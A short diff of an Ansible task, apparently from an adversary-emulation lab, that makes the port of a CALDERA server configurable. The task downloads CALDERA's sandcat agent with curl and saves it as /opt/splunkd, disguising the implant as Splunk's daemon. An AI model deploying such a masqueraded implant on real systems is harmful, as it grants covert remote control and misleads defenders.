@@ -52,7 +52,7 @@
         curl -s -X POST
         -H 'file:sandcat.go'
         -H 'platform:linux'
-        http://{{ caldera_ip }}:8888/file/download > /opt/splunkd
+        http://{{ caldera_ip }}:{{ caldera_port }}/file/download > /opt/splunkd
       args:
         executable: /bin/bash
 
